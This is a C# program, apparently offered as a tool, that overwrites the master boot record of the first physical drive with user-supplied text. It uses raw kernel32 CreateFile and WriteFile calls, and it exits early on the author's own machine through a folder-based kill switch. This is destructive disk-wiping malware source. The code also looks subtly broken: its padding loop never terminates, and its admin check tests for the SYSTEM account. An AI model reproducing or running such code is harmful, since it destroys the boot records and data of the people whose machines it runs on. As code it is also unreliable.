using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.ConstrainedExecution;
using System.Runtime.InteropServices;
using System.Security;
using System.Text;
using System.Threading.Tasks;

namespace fxckMBR
{
	internal class Program
	{

		const int MBR_LENGTH = 512;
		static void Main(string[] args)
		{

			// protect for me
			if (Directory.Exists("C:\\AeroGlass")) { Environment.Exit(0); return; }

			Console.Clear();
			Console.Title = "fxckMBR";
			if (!System.Security.Principal.WindowsIdentity.GetCurrent().IsSystem)
			{
				Console.WriteLine("Please run as admin!");
				Environment.Exit(0);
			}

			Console.WriteLine("> Enter custom text to write mbr.");
			string iBuffer = Console.ReadLine();
			byte[] bBytes = Encoding.ASCII.GetBytes(iBuffer);

			if (bBytes.Length > (int)MBR_LENGTH)
			{
				Console.WriteLine("Error: Custom text is too long! (must be less than 512 bytes)");
				Environment.Exit(0);
			}

			/* Mbr size must be 512 length. */
			MemoryStream sr = new MemoryStream(bBytes);
			sr.Seek(0L, SeekOrigin.End); /* Write to end of stream. */
			while (bBytes.Length != (int)MBR_LENGTH)
			{
				sr.WriteByte(0x00); // Write empty byte
			}
			OverWrite(bBytes);

		}

		static void OverWrite(byte[] data)
		{

			var mHwnd = CreateFile(
					"\\\\.\\PhysicalDrive0",
					0x10000000, /* GENERIC_ALL */
					0x1 | 0x2, /* FILE_READ & FILE_WRITE */
					IntPtr.Zero,
					0x3, /* OPEN_EXISTING */
					(int)0,
					IntPtr.Zero);

			if (mHwnd == (IntPtr)(-0x1))
			{
				Console.WriteLine("Failed to create handle of mbr.");
				Environment.Exit(0);
			}

			/* Custom MBR overwrite message can be done with byte hex array. */
			bool wFile = WriteFile(mHwnd, data, (int)MBR_LENGTH, out _, IntPtr.Zero);
			CloseHandle(mHwnd);

			if (wFile)
			{
				Console.WriteLine("Mbr overwrite success. Restart to take effects.");
				Environment.Exit(0);
			}
			else
			{
				Console.WriteLine("Failed to write buffer to mbr.");
				Environment.Exit(0);
			}

		}

		#region Imports

		[DllImport("kernel32")]
		private static extern IntPtr CreateFile(
			string lpFileName,
			uint dwDesiredAccess,
			uint dwShareMode,
			IntPtr lpSecurityAttributes,
			uint dwCreationDisposition,
			uint dwFlagsAndAttributes,
			IntPtr hTemplateFile);

		[DllImport("kernel32")]
		private static extern bool WriteFile(
			IntPtr hFile,
			byte[] lpBuffer,
			uint nNumberOfBytesToWrite,
			out uint lpNumberOfBytesWritten,
			IntPtr lpOverlapped);

		[DllImport("kernel32.dll", SetLastError = true)]
		[ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
		[SuppressUnmanagedCodeSecurity]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool CloseHandle(IntPtr hObject);

		#endregion

	}
}
